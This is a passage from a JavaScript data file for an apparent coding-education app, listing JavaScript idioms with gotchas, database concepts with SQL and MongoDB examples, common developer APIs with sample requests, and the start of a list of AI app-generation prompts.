      gotchas: 'If arr is null/undefined, .length throws.',
    },
    {
      idiom: 'String to number',
      pattern: 'const n = parseInt(str, 10);',
      modernAlternative: 'const n = Number(str);\n// Or: const n = +str;',
      explanation: 'parseInt for integer (with base). Number for any number. + for short syntax.',
      gotchas: 'parseInt without radix can guess wrong (hex, octal). Always pass 10.',
    },
    {
      idiom: 'Array of N items',
      pattern: 'const arr = new Array(5).fill(0);',
      modernAlternative: 'const arr = Array.from({length: 5}, () => 0);',
      explanation: 'fill() works but mutates. Array.from is cleaner + can compute each.',
      gotchas: 'new Array(5) creates array of empty slots, not zeros, without fill.',
    },
    {
      idiom: 'Range of numbers',
      pattern: 'const arr = [];\nfor (let i = 0; i < 10; i++) arr.push(i);',
      modernAlternative: 'const arr = Array.from({length: 10}, (_, i) => i);\n// Or: const arr = [...Array(10).keys()];',
      explanation: 'Modern way avoids explicit loops.',
      gotchas: 'Different approaches. Pick what your team prefers.',
    },
    {
      idiom: 'Random integer in range',
      pattern: 'const n = Math.floor(Math.random() * 10) + 1; // 1-10',
      modernAlternative: 'function randInt(min, max) {\n  return Math.floor(Math.random() * (max - min + 1)) + min;\n}',
      explanation: 'Standard pattern. Helper function makes it reusable.',
      gotchas: 'Math.random() never returns 1. Math.floor for integers.',
    },
    {
      idiom: 'Shuffle an array',
      pattern: '// Fisher-Yates:\nfor (let i = arr.length - 1; i > 0; i--) {\n  const j = Math.floor(Math.random() * (i + 1));\n  [arr[i], arr[j]] = [arr[j], arr[i]];\n}',
      modernAlternative: 'function shuffle(arr) {\n  const result = [...arr];\n  for (let i = result.length - 1; i > 0; i--) {\n    const j = Math.floor(Math.random() * (i + 1));\n    [result[i], result[j]] = [result[j], result[i]];\n  }\n  return result;\n}',
      explanation: 'Fisher-Yates is the canonical shuffle. Many "simple" shuffles produce biased results.',
      gotchas: 'arr.sort(() => Math.random() - 0.5) is BIASED. Don\'t use.',
    },
    {
      idiom: 'Deep equality check',
      pattern: 'JSON.stringify(a) === JSON.stringify(b)',
      modernAlternative: '// Use a library:\n// import { isEqual } from "lodash";\n// isEqual(a, b)\n\n// Or write a helper for your case',
      explanation: 'JSON-string compare works for simple objects but not for: functions, undefined, Date, regex, circular refs.',
      gotchas: 'JSON.stringify ignores undefined + functions. Different key orders fail.',
    },
    {
      idiom: 'Merge objects',
      pattern: 'const merged = Object.assign({}, obj1, obj2);',
      modernAlternative: 'const merged = { ...obj1, ...obj2 };\n\n// Deep merge needs library or custom:\nfunction deepMerge(...objects) { /* ... */ }',
      explanation: 'Spread is preferred for shallow merge. Deep merge needs more work.',
      gotchas: 'Later objects override earlier. Shallow only.',
    },
    {
      idiom: 'Array unique',
      pattern: 'const unique = arr.filter((item, i) => arr.indexOf(item) === i);',
      modernAlternative: 'const unique = [...new Set(arr)];',
      explanation: 'Set automatically deduplicates. Much cleaner + faster.',
      gotchas: 'Set uses ===. Objects compared by reference, not value.',
    },
    {
      idiom: 'Object → Map',
      pattern: 'const map = new Map(Object.entries(obj));',
      modernAlternative: 'const map = new Map(Object.entries(obj));\n// (Same — this IS the modern way)',
      explanation: 'When you need Map features (any key type, iterable order, size).',
      gotchas: 'Object keys are always strings. Map keys can be anything.',
    },
    {
      idiom: 'Empty array check',
      pattern: 'if (arr.length === 0) { /* empty */ }',
      modernAlternative: 'if (!arr.length) { /* empty */ }\n// Or for null safety: if (!arr?.length)',
      explanation: 'Most common patterns.',
      gotchas: 'Without ?., null arr throws.',
    },
    {
      idiom: 'Null/undefined check',
      pattern: 'if (val == null) { /* null or undefined */ }',
      modernAlternative: 'if (val == null) { /* same */ }\n// Or explicit: if (val === null || val === undefined)\n// Or with optional chaining: obj?.prop',
      explanation: '== null is the one place loose equality is preferred. Catches both.',
      gotchas: 'Most code should use === . But == null is a deliberate exception.',
    },
    {
      idiom: 'Conditional render (React)',
      pattern: '{ condition ? <A /> : <B /> }',
      modernAlternative: '{ condition && <A /> }\n{ !condition && <B /> }',
      explanation: 'Ternary for if/else. && for if-only.',
      gotchas: '0 && X renders 0 (not nothing!). Use Boolean(x) && X.',
    },
    {
      idiom: 'Promise.all',
      pattern: 'const [a, b, c] = await Promise.all([\n  fetchA(),\n  fetchB(),\n  fetchC()\n]);',
      modernAlternative: '// Same. Promise.all is idiomatic.',
      explanation: 'Run async operations in parallel. Wait for all to resolve.',
      gotchas: 'If ANY rejects, Promise.all rejects. Use Promise.allSettled to keep going.',
    },
    {
      idiom: 'Async iteration',
      pattern: 'for (const item of arr) {\n  await asyncOp(item);\n}',
      modernAlternative: '// Sequential (slow if items independent):\nfor (const item of arr) await asyncOp(item);\n\n// Parallel (faster if items independent):\nawait Promise.all(arr.map(item => asyncOp(item)));',
      explanation: 'Sequential when order matters or operations depend on each other. Parallel otherwise.',
      gotchas: 'Sequential is much slower. Parallel can overwhelm APIs.',
    },
    {
      idiom: 'Format date',
      pattern: 'new Date().toLocaleDateString()',
      modernAlternative: 'new Date().toLocaleDateString("en-US", {\n  year: "numeric", month: "long", day: "numeric"\n});\n// Use a library for complex formatting: date-fns, dayjs',
      explanation: 'Built-in for simple. Library for complex.',
      gotchas: 'Default format varies by locale.',
    },
    {
      idiom: 'Convert nullable to default',
      pattern: 'const name = obj.name || "Anonymous";',
      modernAlternative: 'const name = obj.name ?? "Anonymous";\n// (modern, only checks null/undefined)',
      explanation: '|| also defaults for 0, "". ?? is more precise.',
      gotchas: '|| defaults too aggressively. ?? is safer.',
    },
    {
      idiom: 'Iterate object',
      pattern: 'Object.keys(obj).forEach(key => {\n  console.log(key, obj[key]);\n});',
      modernAlternative: 'for (const [key, value] of Object.entries(obj)) {\n  console.log(key, value);\n}',
      explanation: 'for...of is cleaner. Both work.',
      gotchas: 'Iteration order is insertion for strings, numeric for number-like keys.',
    },
    {
      idiom: 'Compute property name',
      pattern: 'const obj = {};\nobj[key] = value;',
      modernAlternative: 'const obj = { [key]: value };',
      explanation: 'Computed property names in object literals. ES6.',
      gotchas: 'Square brackets required for computed.',
    },
    {
      idiom: 'Template strings',
      pattern: '"Hello, " + name + "!"',
      modernAlternative: '`Hello, ${name}!`',
      explanation: 'Template literals are cleaner + support expressions.',
      gotchas: 'Backticks not single quotes.',
    },
    {
      idiom: 'Switch alternative',
      pattern: 'switch (color) {\n  case "red": go(); break;\n  case "green": stop(); break;\n}',
      modernAlternative: 'const actions = {\n  "red": go,\n  "green": stop\n};\nconst action = actions[color];\nif (action) action();',
      explanation: 'Object lookup is sometimes cleaner than switch.',
      gotchas: 'Object approach can be more performant for many cases.',
    },
  ];

  // ─── Database concepts (for full-stack students) ──────────────────
  var DATABASE_CONCEPTS = [
    {
      concept: 'SQL (Structured Query Language)',
      what: 'Language for relational databases. Used to query, insert, update, delete data.',
      example: '-- Select all users:\nSELECT * FROM users;\n\n-- Find specific:\nSELECT name, email FROM users WHERE age > 18;\n\n-- Insert:\nINSERT INTO users (name, email) VALUES (\'Alice\', \'alice@example.com\');\n\n-- Update:\nUPDATE users SET status = \'active\' WHERE id = 1;\n\n-- Delete:\nDELETE FROM users WHERE id = 5;\n\n-- Joins:\nSELECT u.name, p.title FROM users u JOIN posts p ON p.user_id = u.id;',
      whenUse: 'Structured data with relationships. Most apps.',
      learning_resources: 'sqlzoo.net, w3schools.com, sqlbolt.com',
      gotchas: 'SQL injection is real. Use parameterized queries.',
    },
    {
      concept: 'NoSQL',
      what: 'Non-relational databases. Documents, key-value, graph, columnar.',
      example: '// Document store (MongoDB):\ndb.users.insertOne({ name: "Alice", email: "alice@example.com" });\n\n// Find:\ndb.users.find({ age: { $gt: 18 } });\n\n// Update:\ndb.users.updateOne({ id: 1 }, { $set: { status: "active" }});\n\n// Joins (less common):\ndb.users.aggregate([\n  { $lookup: {\n    from: "posts",\n    localField: "_id",\n    foreignField: "user_id",\n    as: "posts"\n  }}\n]);',
      whenUse: 'Flexible schemas. Massive scale. Document-based data.',
      learning_resources: 'mongodb.com/learn',
      gotchas: 'Schemaless can mean inconsistent data. Plan schema.',
    },
    {
      concept: 'ACID vs BASE',
      what: 'ACID: Atomicity, Consistency, Isolation, Durability. Guaranteed by SQL DBs. BASE: Basically Available, Soft state, Eventually consistent. NoSQL trade-off.',
      example: '// SQL: All-or-nothing transactions\nBEGIN;\nUPDATE accounts SET balance = balance - 100 WHERE id = 1;\nUPDATE accounts SET balance = balance + 100 WHERE id = 2;\nCOMMIT;\n// Either both happen or neither — even on power failure\n\n// NoSQL: Faster but eventual consistency\n// May see "balance = 50" temporarily then "balance = 50, transaction pending"',
      whenUse: 'ACID for financial/critical. BASE for high-throughput.',
      learning_resources: 'Database textbooks. Online courses.',
      gotchas: 'BASE = accepting inconsistency for performance. Sometimes acceptable, sometimes catastrophic.',
    },
    {
      concept: 'Indexes',
      what: 'Speed up reads at cost of writes. Like a book\'s index.',
      example: '-- Without index, SELECT WHERE email = \'...\' scans every row\n-- With index, jumps directly\n\nCREATE INDEX idx_users_email ON users(email);\n\n-- Now this is fast:\nSELECT * FROM users WHERE email = \'alice@example.com\';',
      whenUse: 'On columns frequently searched.',
      learning_resources: 'Use EXPLAIN ANALYZE to see if queries use indexes.',
      gotchas: 'Indexes take space + slow writes. Don\'t over-index.',
    },
    {
      concept: 'Foreign keys + relationships',
      what: 'Define relationships between tables.',
      example: '-- Users table\nCREATE TABLE users (\n  id INT PRIMARY KEY,\n  name VARCHAR(255)\n);\n\n-- Posts table with foreign key\nCREATE TABLE posts (\n  id INT PRIMARY KEY,\n  user_id INT REFERENCES users(id),\n  title VARCHAR(255)\n);\n\n-- One-to-many: One user has many posts\n-- Many-to-many: Need a join table\nCREATE TABLE user_tags (\n  user_id INT REFERENCES users(id),\n  tag_id INT REFERENCES tags(id)\n);',
      whenUse: 'When data is related (most cases).',
      learning_resources: 'Database design textbooks.',
      gotchas: 'Cascading deletes can be dangerous.',
    },
    {
      concept: 'Normalization',
      what: 'Organize data to reduce redundancy. 1NF, 2NF, 3NF, etc.',
      example: '-- Denormalized (everything in one table):\nposts (id, title, author_name, author_email)\n-- Problem: if author info changes, must update everywhere\n\n-- Normalized:\nusers (id, name, email)\nposts (id, user_id, title)\n-- Author info in one place. Updates safe.',
      whenUse: 'Most database designs.',
      learning_resources: 'Database textbooks.',
      gotchas: 'Sometimes denormalize for performance (caches). Trade-off.',
    },
    {
      concept: 'Transactions',
      what: 'A unit of work that must succeed or fail atomically.',
      example: 'BEGIN;\nUPDATE accounts SET balance = balance - 100 WHERE id = 1;\nUPDATE accounts SET balance = balance + 100 WHERE id = 2;\n-- If second fails, both roll back:\n-- ROLLBACK;\n-- Otherwise commit:\nCOMMIT;',
      whenUse: 'When multiple operations must succeed together.',
      learning_resources: 'Database concepts.',
      gotchas: 'Transactions hold locks — can cause deadlocks.',
    },
    {
      concept: 'Pessimistic vs optimistic locking',
      what: 'Pessimistic: lock before changing (prevents conflicts but slow). Optimistic: try, retry on conflict (fast).',
      example: '-- Pessimistic (postgres example):\nBEGIN;\nSELECT * FROM accounts WHERE id = 1 FOR UPDATE;\n-- Other transactions wait\nUPDATE accounts SET balance = ...;\nCOMMIT;\n\n-- Optimistic:\nSELECT version FROM accounts WHERE id = 1;\nUPDATE accounts SET balance = ..., version = version + 1 \n  WHERE id = 1 AND version = (the version we read);\n-- If 0 rows affected, retry',
      whenUse: 'Pessimistic for high-conflict. Optimistic for low-conflict.',
      learning_resources: 'Database textbooks.',
      gotchas: 'Optimistic can starve in high contention.',
    },
    {
      concept: 'Indexes vs full-text search',
      what: 'Standard indexes for exact matches. Full-text for searching words in text.',
      example: '-- Standard index:\nCREATE INDEX idx_users_email ON users(email);\n-- Fast for: WHERE email = ?\n-- Slow for: WHERE email LIKE \'%ali%\'\n\n-- Full-text index:\nCREATE INDEX idx_posts_content ON posts USING GIN(to_tsvector(\'english\', content));\n-- Fast for: WHERE to_tsvector(\'english\', content) @@ to_tsquery(\'apple\')',
      whenUse: 'Full-text for searching natural language. Standard for IDs.',
      learning_resources: 'Postgres + MongoDB docs on full-text.',
      gotchas: 'Full-text indexes are larger + slower to write.',
    },
    {
      concept: 'Sharding',
      what: 'Split data across multiple databases/servers for scale.',
      example: '// User 1-100K → Database 1\n// User 100K-200K → Database 2\n// etc.\n\n// To query user 150K:\nconst db = getShard(userId); // determines which db\nconst result = db.users.find({ id: userId });',
      whenUse: 'When single DB can\'t handle load.',
      learning_resources: 'Database scaling books.',
      gotchas: 'Cross-shard queries are slow. Hot spots can develop.',
    },
    {
      concept: 'Replication',
      what: 'Copy data to multiple servers for availability + read scaling.',
      example: '// Primary handles writes\n// Replicas handle reads\n\n// Write:\nawait db.users.insert({ name: "Alice" });\n// Goes to primary\n\n// Read:\nawait db.users.find({});\n// Could go to any replica',
      whenUse: 'For read-heavy apps. For high availability.',
      learning_resources: 'Database concepts.',
      gotchas: 'Replica lag — reads may be slightly stale.',
    },
    {
      concept: 'Connection pooling',
      what: 'Reuse database connections instead of creating new ones for each query.',
      example: '// Without pooling:\nconst conn = new Connection();\nconst result = await conn.query(...);\nconn.close();\n// New connection each time = SLOW\n\n// With pooling:\nconst pool = new Pool({ max: 10 });\nconst result = await pool.query(...);\n// Connection borrowed + returned',
      whenUse: 'Production apps with frequent DB access.',
      learning_resources: 'pg-pool docs, mongodb connection docs.',
      gotchas: 'Pool size matters. Too small = wait. Too large = overwhelm DB.',
    },
    {
      concept: 'Migrations',
      what: 'Version-controlled database schema changes.',
      example: '// migrations/001_create_users.sql\nCREATE TABLE users (\n  id SERIAL PRIMARY KEY,\n  email VARCHAR(255) UNIQUE\n);\n\n// migrations/002_add_age.sql\nALTER TABLE users ADD COLUMN age INT;\n\n// Tools: Knex, Sequelize, Prisma, Alembic, etc.',
      whenUse: 'Always — track schema changes.',
      learning_resources: 'Migration tool docs.',
      gotchas: 'Migrations should be reversible. Don\'t make irreversible changes lightly.',
    },
    {
      concept: 'Backup + recovery',
      what: 'Save database state to disk + restore from it.',
      example: '# Postgres backup\npg_dump mydb > backup.sql\n\n# Restore\npsql mydb < backup.sql\n\n# Cloud DBs handle automatically (configure retention)',
      whenUse: 'Production apps. Always have backups.',
      learning_resources: 'DB vendor backup guides.',
      gotchas: 'Test recovery! Many backups silently fail.',
    },
    {
      concept: 'ORM (Object-Relational Mapping)',
      what: 'Map database tables to objects in your code. Avoid raw SQL.',
      example: '// With ORM (Prisma):\nconst user = await prisma.user.create({\n  data: { name: "Alice", email: "alice@example.com" }\n});\n\n// Same with Sequelize:\nconst user = await User.create({\n  name: "Alice",\n  email: "alice@example.com"\n});\n\n// Raw SQL (lower-level):\nconst user = await db.query(\n  "INSERT INTO users (name, email) VALUES ($1, $2) RETURNING *",\n  ["Alice", "alice@example.com"]\n);',
      whenUse: 'For most apps. Cleaner code.',
      learning_resources: 'Prisma, Sequelize, TypeORM docs.',
      gotchas: 'ORM can be slow for complex queries. Sometimes drop to raw SQL.',
    },
  ];

  // ─── Famous APIs developers should know (free + paid) ───────────
  var POPULAR_APIS = [
    {
      name: 'OpenAI API (ChatGPT, GPT-4, etc.)',
      type: 'AI/Language',
      url: 'platform.openai.com',
      pricing: 'Pay per token (cheap for small use)',
      authMethod: 'API key',
      whatItDoes: 'Generate text, code, images. Conversational AI.',
      keyEndpoints: ['Chat completions', 'Text completions', 'Embeddings', 'Image generation (DALL-E)', 'Whisper (speech-to-text)'],
      example: 'POST /v1/chat/completions\n{\n  "model": "gpt-4",\n  "messages": [{"role":"user","content":"Hello"}]\n}',
      useCases: ['Chatbots', 'Code generation', 'Content writing', 'Summarization', 'Translation'],
      limits: 'Token-based. Rate limits per minute. Costs add up.',
      ethics: 'Be transparent about AI use. Costs + carbon footprint.',
    },
    {
      name: 'Anthropic API (Claude)',
      type: 'AI/Language',
      url: 'console.anthropic.com',
      pricing: 'Pay per token',
      authMethod: 'API key',
      whatItDoes: 'Claude — competitor to ChatGPT. Strong reasoning + writing.',
      keyEndpoints: ['Messages API', 'Tool use', 'Vision'],
      example: 'POST /v1/messages\n{\n  "model": "claude-3-opus",\n  "messages": [{"role":"user","content":"Hello"}]\n}',
      useCases: ['Same as OpenAI but with different style + strengths.'],
      limits: 'Token-based. Rate limits.',
      ethics: 'Same as OpenAI.',
    },
    {
      name: 'Google Gemini API',
      type: 'AI/Language',
      url: 'ai.google.dev',
      pricing: 'Free tier available',
      authMethod: 'API key (Google AI Studio)',
      whatItDoes: 'Google\'s LLM API. Strong multimodal (text + images + code).',
      keyEndpoints: ['Generate content', 'Image generation'],
      example: 'POST /v1beta/models/gemini-pro:generateContent\n{\n  "contents":[{"parts":[{"text":"Hello"}]}]\n}',
      useCases: ['Code generation (used in this AppLab tool!)', 'Multimodal apps', 'Content generation'],
      limits: 'Free tier has rate limits.',
      ethics: 'Same as other LLMs.',
    },
    {
      name: 'Stripe (Payments)',
      type: 'Payments',
      url: 'stripe.com',
      pricing: '2.9% + $0.30 per transaction',
      authMethod: 'API key (separate test + live keys)',
      whatItDoes: 'Accept credit card + bank payments online.',
      keyEndpoints: ['Charges', 'Customers', 'Subscriptions', 'Invoices', 'Webhooks'],
      example: 'POST /v1/charges\n{\n  "amount": 1000,\n  "currency": "usd",\n  "source": "tok_..."\n}',
      useCases: ['E-commerce', 'SaaS subscriptions', 'Donations', 'Marketplaces'],
      limits: 'Per-country availability. Compliance requirements.',
      ethics: 'PCI compliance. Don\'t store card numbers yourself — Stripe does it.',
    },
    {
      name: 'Twilio (SMS/Voice)',
      type: 'Communications',
      url: 'twilio.com',
      pricing: 'Pay per message ($0.01-$0.05 SMS)',
      authMethod: 'Account SID + Auth Token',
      whatItDoes: 'Send SMS, make calls, video calls, WhatsApp messages.',
      keyEndpoints: ['Messages', 'Calls', 'WhatsApp', 'Verify (2FA)'],
      example: 'POST /Accounts/{AccountSid}/Messages.json\n{\n  "From": "+15551234567",\n  "To": "+15559876543",\n  "Body": "Hello"\n}',
      useCases: ['SMS notifications', '2FA codes', 'Customer service calls', 'WhatsApp messaging'],
      limits: 'Per-country regulations on SMS.',
      ethics: 'Don\'t spam. Honor opt-outs. Privacy of phone numbers.',
    },
    {
      name: 'SendGrid / Mailgun (Email)',
      type: 'Email',
      url: 'sendgrid.com / mailgun.com',
      pricing: 'Free tier for small volume',
      authMethod: 'API key',
      whatItDoes: 'Send transactional emails (signup confirmation, password reset, etc.)',
      keyEndpoints: ['Send email', 'Templates', 'Webhooks (delivery + open events)'],
      example: 'POST /v3/mail/send\n{\n  "personalizations": [...],\n  "from": {"email":"..."},\n  "subject": "...",\n  "content": [...]\n}',
      useCases: ['Onboarding emails', 'Password resets', 'Notifications', 'Newsletters'],
      limits: 'Volume limits. Spam reputation impacts deliverability.',
      ethics: 'Honor unsubscribes. CAN-SPAM Act compliance.',
    },
    {
      name: 'Cloudinary (Image/Video Hosting)',
      type: 'Media',
      url: 'cloudinary.com',
      pricing: 'Free tier',
      authMethod: 'API key + secret',
      whatItDoes: 'Upload, transform, deliver images + videos. Built-in CDN.',
      keyEndpoints: ['Upload', 'Transform (resize, crop, filters)', 'Delivery URLs'],
      example: 'Upload via web interface or API. Reference via URL with transformations:\nhttps://res.cloudinary.com/demo/image/upload/w_300,h_300,c_thumb,g_face/sample.jpg',
      useCases: ['User avatars', 'Product photos', 'Video hosting', 'CDN'],
      limits: 'Bandwidth limits on free tier.',
      ethics: 'Respect user privacy. Image rights.',
    },
    {
      name: 'Firebase (Backend-as-a-Service)',
      type: 'BaaS',
      url: 'firebase.google.com',
      pricing: 'Free tier for small apps',
      authMethod: 'Per-service auth',
      whatItDoes: 'Authentication, database, hosting, push notifications, analytics, ML — all in one.',
      keyEndpoints: ['Auth', 'Firestore (NoSQL)', 'Realtime Database', 'Storage', 'Hosting', 'Functions'],
      example: '// Add auth + Firestore:\nimport { initializeApp } from "firebase/app";\nconst app = initializeApp(config);\nconst db = getFirestore(app);\nawait setDoc(doc(db, "users", "alice"), { name: "Alice" });',
      useCases: ['Quick MVP', 'Real-time features', 'Mobile + web apps with backend'],
      limits: 'Free tier read/write limits. Vendor lock-in.',
      ethics: 'Privacy + GDPR considerations. Google account required.',
    },
    {
      name: 'Supabase (Open-source Firebase alternative)',
      type: 'BaaS',
      url: 'supabase.com',
      pricing: 'Free tier',
      authMethod: 'API key',
      whatItDoes: 'PostgreSQL database, auth, storage, real-time, all in one.',
      keyEndpoints: ['Auth', 'Database (SQL!)', 'Storage', 'Realtime', 'Edge functions'],
      example: 'import { createClient } from "@supabase/supabase-js";\nconst supabase = createClient(URL, KEY);\nconst { data } = await supabase.from("users").select();',
      useCases: ['When you want SQL + Firebase ease + open-source', 'MVPs', 'Apps with relational data'],
      limits: 'Free tier has limits.',
      ethics: 'Open source — can self-host. Privacy controls.',
    },
    {
      name: 'GitHub API',
      type: 'Developer',
      url: 'api.github.com',
      pricing: 'Free (5000 requests/hour authenticated, 60 unauth)',
      authMethod: 'Personal access token or OAuth',
      whatItDoes: 'Access + modify GitHub content. Issues, PRs, repos, users.',
      keyEndpoints: ['Repos', 'Issues', 'Pull requests', 'Users', 'Search'],
      example: 'GET https://api.github.com/repos/torvalds/linux',
      useCases: ['Dev dashboards', 'Auto-creating issues', 'Stats sites', 'Bot accounts'],
      limits: 'Rate limits. Some endpoints require specific scopes.',
      ethics: 'Don\'t spam. Don\'t abuse free tier.',
    },
    {
      name: 'Open-Meteo (Weather)',
      type: 'Data',
      url: 'open-meteo.com',
      pricing: 'Free, no API key required',
      authMethod: 'None',
      whatItDoes: 'Weather forecasts + historical data.',
      keyEndpoints: ['Forecast', 'Historical', 'Air quality'],
      example: 'https://api.open-meteo.com/v1/forecast?latitude=52.52&longitude=13.41&current_weather=true',
      useCases: ['Weather apps', 'Climate data', 'Educational projects'],
      limits: 'Fair use. Don\'t hammer.',
      ethics: 'Free as in beer. Acknowledge in docs.',
    },
    {
      name: 'REST Countries',
      type: 'Reference',
      url: 'restcountries.com',
      pricing: 'Free',
      authMethod: 'None',
      whatItDoes: 'Country info: capital, currency, languages, flags.',
      keyEndpoints: ['All countries', 'By name', 'By code'],
      example: 'https://restcountries.com/v3.1/name/usa',
      useCases: ['Country selectors', 'Educational apps', 'Travel apps'],
      limits: 'Fair use.',
      ethics: 'Data is public. Acknowledge.',
    },
    {
      name: 'Stripe (alternative)',
      type: 'Payments',
      url: 'stripe.com',
      pricing: '2.9% + $0.30',
      authMethod: 'Secret + publishable keys',
      whatItDoes: 'Process payments online.',
      keyEndpoints: ['Charges', 'PaymentIntents', 'Subscriptions', 'Webhooks'],
      example: 'See Stripe Stripe entry above',
      useCases: 'See Stripe above',
      limits: 'See Stripe above',
      ethics: 'PCI compliance. Privacy of card data.',
    },
    {
      name: 'Auth0 (Authentication-as-a-service)',
      type: 'Authentication',
      url: 'auth0.com',
      pricing: 'Free tier',
      authMethod: 'API keys',
      whatItDoes: 'OAuth login (Google, Facebook, GitHub, etc.) + custom auth.',
      keyEndpoints: ['Authorize', 'Token', 'Userinfo', 'Management API'],
      example: '// Frontend:\nimport { Auth0Provider } from "@auth0/auth0-react";\n<Auth0Provider domain="..." clientId="...">',
      useCases: ['Apps with social login', 'Apps with MFA needs', 'Multi-tenant SaaS'],
      limits: 'Free tier user limits.',
      ethics: 'GDPR compliance. Privacy.',
    },
    {
      name: 'OpenWeatherMap',
      type: 'Data',
      url: 'openweathermap.org',
      pricing: 'Free tier (60 calls/minute)',
      authMethod: 'API key',
      whatItDoes: 'Weather forecasts. More features than Open-Meteo.',
      keyEndpoints: ['Current weather', 'Forecast', 'Historical', 'Weather alerts'],
      example: 'https://api.openweathermap.org/data/2.5/weather?q=London&appid=YOUR_API_KEY',
      useCases: 'Weather apps with more features.',
      limits: 'Free tier rate limits.',
      ethics: 'Standard API ethics.',
    },
    {
      name: 'Google Maps API',
      type: 'Maps',
      url: 'developers.google.com/maps',
      pricing: '$2 per 1000 map loads after free credit',
      authMethod: 'API key',
      whatItDoes: 'Maps, geocoding, places, routes.',
      keyEndpoints: ['JavaScript Maps API', 'Geocoding', 'Places', 'Directions'],
      example: '<script src="https://maps.googleapis.com/maps/api/js?key=YOUR_KEY&libraries=places"></script>',
      useCases: ['Maps in apps', 'Restaurant finders', 'Delivery apps'],
      limits: 'Daily quota. Cost adds up.',
      ethics: 'User location privacy. Permission required.',
    },
    {
      name: 'Mapbox (Google Maps alternative)',
      type: 'Maps',
      url: 'mapbox.com',
      pricing: 'Free tier (50,000 monthly loads)',
      authMethod: 'Access token',
      whatItDoes: 'Maps with great customization. Often cheaper than Google.',
      keyEndpoints: ['Maps JS API', 'Geocoding', 'Directions', 'Static maps'],
      example: '// In JS:\nimport mapboxgl from "mapbox-gl";\nmapboxgl.accessToken = "YOUR_TOKEN";\nconst map = new mapboxgl.Map({\n  container: "map", style: "mapbox://styles/mapbox/streets-v11"\n});',
      useCases: ['Maps for cost-sensitive apps', 'Custom-styled maps'],
      limits: 'Free tier load limits.',
      ethics: 'User privacy. Permission.',
    },
    {
      name: 'AWS S3 (Storage)',
      type: 'Cloud storage',
      url: 's3.amazonaws.com',
      pricing: '$0.023/GB stored + bandwidth',
      authMethod: 'Access key + secret',
      whatItDoes: 'Cloud object storage. Files, backups, hosting.',
      keyEndpoints: ['Put object', 'Get object', 'List bucket'],
      example: 'aws s3 cp file.txt s3://mybucket/',
      useCases: ['Image/video hosting', 'Backups', 'Static site hosting'],
      limits: 'Standard usage limits.',
      ethics: 'Encryption at rest + transit. Access control.',
    },
    {
      name: 'Algolia (Search)',
      type: 'Search',
      url: 'algolia.com',
      pricing: 'Free tier',
      authMethod: 'API key',
      whatItDoes: 'Hosted search engine. Fast, typo-tolerant, faceted search.',
      keyEndpoints: ['Index data', 'Search', 'Analytics'],
      example: 'const client = algoliasearch("APP_ID", "API_KEY");\nconst index = client.initIndex("products");\nconst { hits } = await index.search("query");',
      useCases: ['E-commerce search', 'Documentation search', 'Site-wide search'],
      limits: 'Free tier search-record limits.',
      ethics: 'Standard.',
    },
    {
      name: 'Vercel (Hosting)',
      type: 'Hosting',
      url: 'vercel.com',
      pricing: 'Generous free tier',
      authMethod: 'GitHub/GitLab login',
      whatItDoes: 'Deploy static + serverless apps. Built-in CI/CD.',
      keyEndpoints: ['Deploy', 'Functions', 'Domains'],
      example: '// vercel.json\n{\n  "buildCommand": "npm run build",\n  "outputDirectory": "dist"\n}',
      useCases: ['Next.js apps', 'Static sites', 'Serverless APIs'],
      limits: 'Free tier bandwidth + serverless invocations limits.',
      ethics: 'Privacy + GDPR.',
    },
    {
      name: 'Netlify (Hosting)',
      type: 'Hosting',
      url: 'netlify.com',
      pricing: 'Free tier',
      authMethod: 'GitHub/GitLab login',
      whatItDoes: 'Static + serverless hosting. Form handling included.',
      keyEndpoints: ['Deploy', 'Functions', 'Forms', 'Identity (auth)'],
      example: '// netlify.toml\n[build]\ncommand = "npm run build"\npublish = "dist"',
      useCases: ['Static sites', 'JAMstack apps', 'Serverless APIs'],
      limits: 'Free tier limits.',
      ethics: 'Standard.',
    },
    {
      name: 'Cloudflare Pages',
      type: 'Hosting',
      url: 'pages.cloudflare.com',
      pricing: 'Free, generous',
      authMethod: 'GitHub login',
      whatItDoes: 'Static site hosting on Cloudflare\'s edge network.',
      keyEndpoints: ['Deploy', 'Functions', 'Edge functions'],
      example: '// Push to GitHub → auto-deploys',
      useCases: ['Fast static sites', 'Edge functions'],
      limits: 'Unlimited free for static sites!',
      ethics: 'Cloudflare\'s privacy policies apply.',
    },
    {
      name: 'GitHub Pages',
      type: 'Hosting',
      url: 'pages.github.com',
      pricing: 'Free',
      authMethod: 'GitHub account',
      whatItDoes: 'Free static site hosting from GitHub repo.',
      keyEndpoints: ['Push to main branch → live'],
      example: 'Push HTML/CSS/JS to repo. Configure in Settings → Pages.',
      useCases: ['Personal sites', 'Project docs', 'Demos'],
      limits: 'Public repos only (free). 1GB max site size.',
      ethics: 'Public by default.',
    },
    {
      name: 'IFTTT / Zapier (Automation)',
      type: 'Automation',
      url: 'ifttt.com / zapier.com',
      pricing: 'Free tier',
      authMethod: 'Per-service auth',
      whatItDoes: 'Connect different services with triggers + actions. "If X happens, do Y."',
      keyEndpoints: ['Triggers', 'Actions'],
      example: 'If new GitHub issue → send Slack message',
      useCases: ['Workflow automation', 'Cross-service integration'],
      limits: 'Free tier action limits.',
      ethics: 'Authorize only what you need.',
    },
    {
      name: 'Postman (API testing)',
      type: 'Developer tools',
      url: 'postman.com',
      pricing: 'Free tier',
      authMethod: 'Account-based',
      whatItDoes: 'Test APIs. Save requests. Share with team.',
      keyEndpoints: ['Make requests', 'Save collections', 'Mock servers'],
      example: 'GUI for testing APIs. No code needed.',
      useCases: ['API development', 'Testing', 'Documentation'],
      limits: 'Free tier limits on collections + cloud features.',
      ethics: 'Standard.',
    },
  ];

  // ─── 50+ realistic prompts for AI app generation ─────────────────
  // Each entry: prompt template + expected output + what to learn from generating
  var AI_PROMPT_EXAMPLES = [
    {
      prompt: 'Build a To-Do List app with: localStorage persistence, ability to add/check off/delete tasks, drag-to-reorder, and dark mode toggle.',
      category: 'Productivity',
      complexity: 'Intermediate',
      whatYouLearn: 'localStorage, drag-and-drop API, conditional CSS classes, basic state management',
      expectedSize: '~300-500 lines',
      followupPrompts: ['Add categories', 'Add due dates', 'Add export to JSON', 'Add a search bar'],
      reviewChecklist: ['Does it use semantic HTML?', 'Does it have proper labels?', 'Is keyboard accessible?', 'Does it save data correctly?'],
    },
    {
      prompt: 'Create a Pomodoro Study Timer with: 25-min work + 5-min break cycles, customizable durations, progress bar, sound notification, and session counter.',
      category: 'Productivity',
      complexity: 'Beginner',
      whatYouLearn: 'setInterval, time formatting, audio playback, state machine',
      expectedSize: '~200-300 lines',
